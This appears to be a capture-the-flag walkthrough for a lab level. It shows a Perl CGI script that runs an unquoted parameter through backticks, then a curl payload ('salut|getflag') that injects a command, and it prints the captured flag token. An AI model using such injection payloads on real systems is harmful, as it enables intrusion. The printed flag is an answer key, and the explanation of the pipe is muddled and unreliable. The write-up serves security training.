# Perl is a language used for web development and system scripts.

- In the script, the '$y' variable is not quoted, and the print statement is surrounded by `` (backtick operator or interpolation operator).

# View the level04.pl script
```bash
cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
# function that print argument y with echo
sub x {
  $y = $_[0];
  print `echo $y 2>&1`; # redirect stderr to stdout
}
# arg of the param function is "x"
x(param("x"));
```

# Use curl to exploit the vulnerability
first test with something 
- curl http://localhost:4747/?x=wassup

- curl http://localhost:4747/?x='salut|getflag'

# It will execute "salut" (equivalent to echo salut), causing an error.
- The command echo salut|getflag tries to pass the output of echo salut as input to getflag. If getflag expects different input or the current user doesn't have the appropriate permissions to execute getflag this way, it will result in an error.
- The | symbol is used to create a pipeline, meaning getflag will try to read from echo, but getflag does not expect "salut" as valid input, and it will fail.

# As a result, getflag will be executed.

# Token obtained:
ne2searoevaevoem4ov4ar8ap
